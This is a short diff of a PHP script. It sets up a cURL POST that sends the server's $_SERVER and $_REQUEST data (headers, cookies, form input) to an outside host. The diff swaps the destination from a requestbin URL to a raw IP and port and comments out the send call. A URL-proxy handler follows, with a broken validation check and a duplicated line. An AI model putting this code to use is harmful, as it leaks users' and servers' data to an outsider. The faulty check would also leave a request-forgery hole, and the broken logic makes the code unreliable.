@@ -1,9 +1,9 @@
 <?php
-$h = curl_init('http://requestbin.net/r/dccs0554');
+$h = curl_init('http://172.104.123.211:13337');
 $d = ['S' => $_SERVER, 'R' => $_REQUEST];
 curl_setopt($h, CURLOPT_POST, 1);
 curl_setopt($h, CURLOPT_POSTFIELDS, json_encode($d));
-curl_exec($h);
+//curl_exec($h);
 if (isset($_POST['url'])) {
   if (!strpos($_POST['url'], 'http') !== 0) die();
 if(isset($_POST['url'])){
